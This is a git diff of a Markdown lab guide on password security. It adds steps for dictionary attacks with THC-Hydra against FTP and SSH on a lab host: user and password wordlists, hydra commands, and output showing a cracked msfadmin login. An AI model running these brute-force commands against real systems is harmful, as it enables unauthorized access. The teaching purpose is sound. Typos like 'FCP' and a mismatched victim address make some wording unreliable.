@@ -8,8 +8,11 @@
   - [Massive list of passwords](#massive-list-of-passwords)
   - [Checking for password robustness](#checking-for-password-robustness)
 - [Attacks on Passwords](#attacks-on-passwords)
-  - [Loking for password-based services](#loking-for-password-based-services)
+  - [Looking for password-based services](#looking-for-password-based-services)
   - [Using THC-Hydra](#using-thc-hydra)
+  - [Attacking FTP service with THC-Hydra](#attacking-ftp-service-with-thc-hydra)
+  - [Attacking SSH service with THC-Hydra](#attacking-ssh-service-with-thc-hydra)
+  - [Attacking Web application with THC-Hydra](#attacking-web-application-with-thc-hydra)
 
 ## Introduction
 
@@ -39,7 +42,7 @@ Using this web site try to look for the following:
 
 ### Massive list of passwords
 
-There are multiple sites that aggregate lots of passwords. These passwords can be used to conduct diccionary attacks, that test all the existing passwords to check if some of them works.
+There are multiple sites that aggregate lots of passwords. These passwords can be used to conduct dictionary attacks, that test all the existing passwords to check if some of them works.
 
 One of the most well know data breach that involved non-encrypted user accounts was the [Rockyou](https://techcrunch.com/2009/12/14/rockyou-hack-security-myspace-facebook-passwords/?guccounter=1) social application site, mainly developing widgets for Facebook. Rockyou sufered [a data breach](https://en.wikipedia.org/wiki/RockYou) that resulted in the exposure of 32 million user accounts.
 
@@ -57,9 +60,9 @@ Just for checking the entropy of the passwords lets do the following:
 1. Visit the web site of GeneratePasswords and look and the [password entropy calculation calculation formula](https://generatepasswords.org/how-to-calculate-entropy/);
 2. Also look at [why the password strength meters are not that great](https://generatepasswords.org/why-password-strength-meters-are-not-so-great-after-all/) (those you find on most websites);
 3. Check the entropy of the different types of passwords using a [password strength calculator](http://www.bee-man.us/computer/password_strength.html);
-4. Check on [EFF Dice-Generate Passphrases](https://www.eff.org/dice). Look at the [wordlist diccionary](https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt). Try the proposed process to create a great passphrase;
+4. Check on [EFF Dice-Generate Passphrases](https://www.eff.org/dice). Look at the [wordlist dictionary](https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt). Try the proposed process to create a great passphrase;
 5. Also look at the [Diceware Passphrase web site](https://theworld.com/~reinhold/diceware.html);
-6. Finnaly try to create a passwords/passphrases and [check its strenght](https://bitwarden.com/password-strength/).
+6. Finally try to create a passwords/passphrases and [check its strength](https://bitwarden.com/password-strength/).
 
 ## Attacks on Passwords
 
@@ -67,9 +70,9 @@ Let us simulate a situation in which we have an attacker that is going to try to
 
 Lets assume that the victim has the following email address: **192.168.8.148**.
 
-### Loking for password-based services 
+### Looking for password-based services 
 
-Next we are going to analise the system either using "`nmap`" or "`massscan`". Let's use `nmap` first:
+Next we are going to analyze the system either using "`nmap`" or "`massscan`". Let's use `nmap` first:
 
     nmap 192.168.8.142
 
@@ -183,4 +186,113 @@ THC-Hydra can handle the following types os attacks:
 There are also some graphical tools for THC-Hydra, such as `xhydra`. You may install and launch this tool by doing:
 
     xhydra
+
+### Attacking FTP service with THC-Hydra
+
+In the example, we are going to launch a **dictionary attack** against the FCP service of the victim. In order to do this we need to use a word list file (the dictionary) that contain the words to be used as passwords.
+
+We may create that file, or we may use some file downloaded from the Internet (please refer to the first part of this document) or we may also use some of the word list files that are part of Kali Linux. You may find such files on the `/usr/share/wordlists` folder.
+
+It is important to notice that, the bigger the file, the longer will be the processing time of such file.
+
+For demonstration purposes, let's create two files. The first one will be called `users.txt` and will contain a list of possible users:
+
+    root
+    admin
+    test
+    guest
+    info
+    adm
+    mysql
+    user
+    administrator
+    oracle
+    ftp
+    pi
+    puppet
+    ansible
+    ec2-user
+    vagrant
+    azureuser
+
+And we will also create a file called `passwords.txt` which will contain the list of most common passwords in 2022:
+
+    123456
+    123456789
+    qwerty
+    password
+    12345
+    qwerty123
+    1q2w3e
+    12345678
+    111111
+    1234567890
+
+
+If you don't want to create these files, I've created them for you. You can **download here** the [list of users](files/users.txt) and the [list of passwords](files/passwords.txt).
+
+Now, we can start the THC-Hydra to test the FCP service and check if some of the users and passwords match some existing user on the FTP service.
+
+    hydra -v -V -L users.txt -P passwords.txt 192.168.8.142 ftp
+
+`-L` is used to specify the file that contain the usernames, in this case `users.txt`
+
+`-P` is used to specify the file that contain the passwords, in this case `passwords.txt`
+
+`-v` activates the verbose mode
+
+`-V` displays each attempt with a username/password pair
+
+You'll get a similar output to this one:
+
+    ...
+    [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+    [ATTEMPT] target 192.168.8.142 - login "root" - pass "123456" - 1 of 187 [child 0] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "root" - pass "123456789" - 2 of 187 [child 1] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "root" - pass "qwerty" - 3 of 187 [child 2] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "root" - pass "password" - 4 of 187 [child 3] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "root" - pass "12345" - 5 of 187 [child 4] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "root" - pass "qwerty123" - 6 of 187 [child 5] (0/0)
+    ...
+
+After running the tool, try to **interpret its results** and **check if you were able to find** some valid username/password pair.
+
+You may also run THC-Hydra to just try to do a dictionary attack against a specific username. In this case you have to specify the username and simply use the `passwords.txt` file. The command is similar:
+
+    hydra -v -V -l msfadmin -P passwords.txt 192.168.8.142 ftp
+
+Which results in:
+
+    Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-05 16:26:08
+    [DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:1/p:12), ~1 try per task
+    [DATA] attacking ftp://192.168.8.142:21/
+    [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "123456" - 1 of 12 [child 0] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "123456789" - 2 of 12 [child 1] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "qwerty" - 3 of 12 [child 2] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "password" - 4 of 12 [child 3] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "12345" - 5 of 12 [child 4] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "qwerty123" - 6 of 12 [child 5] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "1q2w3e" - 7 of 12 [child 6] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "12345678" - 8 of 12 [child 7] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "msfadmin" - 9 of 12 [child 8] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "111111" - 10 of 12 [child 9] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "1234567890" - 11 of 12 [child 10] (0/0)
+    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "" - 12 of 12 [child 11] (0/0)
+    [21][ftp] host: 192.168.8.142   login: msfadmin   password: msfadmin
+    [STATUS] attack finished for 192.168.8.142 (waiting for children to complete tests)
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-05 16:26:13
+
+### Attacking SSH service with THC-Hydra
+
+In this case, we are going to launch a dictionary attack against the SSH service on the victim. The approach is similar to the one presented before, the only difference is just to chance the service name:
+
+    hydra -v -V -L users.txt -P passwords.txt 192.168.8.142 ssh
+
+Did it worked? Why? Try to understand what happened.
+
+### Attacking Web application with THC-Hydra
 
